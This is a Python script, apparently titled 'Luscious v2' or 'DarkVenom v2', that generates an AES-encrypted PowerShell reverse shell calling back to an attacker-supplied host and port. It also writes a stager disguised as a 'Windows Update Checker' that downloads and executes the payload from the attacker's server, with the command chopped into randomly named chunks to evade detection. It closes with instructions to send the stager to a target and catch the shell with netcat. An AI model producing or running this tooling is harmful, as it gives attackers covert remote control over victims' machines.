#!/usr/bin/python3

import os
import sys
import random
import base64
import argparse
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import zlib

try:
    from rich import print
except:
    print("Error: rich module not found. Install: pip3 install rich")
    sys.exit(1)

infoS = f"[bold cyan][[bold red]*[bold cyan]][white]"
foundS = f"[bold cyan][[bold red]+[bold cyan]][white]"

banner = """
                    _______         .__           .__  .__   
_______   _______  _\   _  \   _____|  |__   ____ |  | |  |  
\_  __ \_/ __ \  \/ /  /_\  \ /  ___/  |  \_/ __ \|  | |  |  
 |  | \/\  ___/\   /\  \_/   \\___ \|   Y  \  ___/|  |_|  |__
 |__|    \___  >\_/  \_____  /____  >___|  /\___  >____/____/
             \/            \/     \/     \/     \/                @luscious 
                                                        
    Luscious v2 - AES Encrypted Reverse Shell
"""
print(banner)

parser = argparse.ArgumentParser(description="DarkVenom v2 - AES Encrypted Reverse Shell")
parser.add_argument("--lhost", help="Your IP address for reverse connections.", required=True)
parser.add_argument("--lport", help="Your port for reverse connections.", required=True)
parser.add_argument("--key", help="Custom encryption key (optional)", default="DARKVENOM2026")
args = parser.parse_args()

# AES Encryption setup
def generate_aes_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_aes(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

# Reverse shell payload
reverse_shell_payload = f'''
function Connect-RevShell {{
    $remoteHost = "{args.lhost}"
    $remotePort = {args.lport}
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    try {{
        $tcpClient.Connect($remoteHost, $remotePort)
        $stream = $tcpClient.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        while ($tcpClient.Connected) {{
            $prompt = "[$env:UserName@$env:ComputerName:" + (Get-Location).Path + "]> "
            $writer.Write($prompt)
            $command = $reader.ReadLine()
            if ($command -eq "exit") {{ break }}
            try {{
                $output = Invoke-Expression $command 2>&1 | Out-String
                $writer.Write($output + "`r`n")
            }} catch {{
                $writer.Write("Error: $_`r`n")
            }}
        }}
        $tcpClient.Close()
    }} catch {{
        Start-Sleep -Seconds 5
        Connect-RevShell
    }}
}}
Connect-RevShell
'''

# Clean old files
oldfls = ["shfile.ps1", "rshell.ps1", "loader.ps1"]
for ff in oldfls:
    if os.path.exists(ff):
        print(f"{infoS} Removing old [bold green]{ff}[white]...")
        os.remove(ff)

# Generate AES key
aes_key = generate_aes_key(args.key)

# Encrypt the payload
encrypted_payload = encrypt_aes(reverse_shell_payload, aes_key)

# Write encrypted payload to rshell.ps1
print(f"{infoS} Creating AES encrypted [bold green]rshell.ps1[white]...")
with open("rshell.ps1", "w") as shdat:
    shdat.write(f"$encrypted = \"{encrypted_payload}\"\n")
    shdat.write(f"$key = \"{base64.b64encode(aes_key).decode()}\"\n")
    shdat.write(f"""
function Decrypt-AES {{
    param($encryptedData, $keyBytes)
    $parts = $encryptedData -split ':'
    $iv = [System.Convert]::FromBase64String($parts[0])
    $cipherText = [System.Convert]::FromBase64String($parts[1])
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $keyBytes
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
    $aes.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).TrimEnd([char]0)
}}
$keyBytes = [System.Convert]::FromBase64String($key)
$scriptBlock = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Decrypt-AES $encrypted $keyBytes)))))
Invoke-Expression $scriptBlock
""")
print(f"{foundS} [bold green]rshell.ps1[white] configured with AES-256 encryption.")

# Create stager (shfile.ps1)
print(f"{infoS} Creating stager [bold green]shfile.ps1[white]...")
template = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{args.lhost}:8000/rshell.ps1')"

# Split into random-sized chunks
chunks = []
idx = 0
while idx < len(template):
    chunk_size = random.randint(1, 5)
    chunks.append(template[idx:idx+chunk_size])
    idx += chunk_size

# Obfuscated variable names
var_names = [f"_{random.randint(10000000,99999999)}" for _ in range(len(chunks))]

with open("shfile.ps1", "w") as shfile:
    shfile.write("# Windows Update Checker v2.1\n")
    shfile.write("function Write-Log { param($msg) Write-Host $msg }\n")
    shfile.write("function Get-SystemInfo { Get-WmiObject Win32_ComputerSystem }\n")
    
    for i, chunk in enumerate(chunks):
        shfile.write(f"${var_names[i]} = \"{chunk}\"\n")
    
    shfile.write("$payload = ")
    for i, var in enumerate(var_names):
        if i == len(var_names)-1:
            shfile.write(f"${var}")
        else:
            shfile.write(f"${var} + ")
    
    shfile.write("\ntry {\n")
    shfile.write("    $script = [ScriptBlock]::Create($payload)\n")
    shfile.write("    Invoke-Command -ScriptBlock $script\n")
    shfile.write("} catch {\n")
    shfile.write("    Write-Log 'Update check failed'\n")
    shfile.write("}\n")

print(f"{foundS} [bold green]shfile.ps1[white] created with advanced obfuscation.")
print(f"\n{infoS} Payload size: {len(reverse_shell_payload)} bytes (AES encrypted)")
print(f"{infoS} Encryption key: [bold yellow]{args.key}[white]")
print(f"\n[bold green]>>> Send shfile.ps1 to target and execute: powershell -Exec Bypass -File shfile.ps1")
print(f"[bold green]>>> On Kali: nc -lvnp {args.lport}\n")
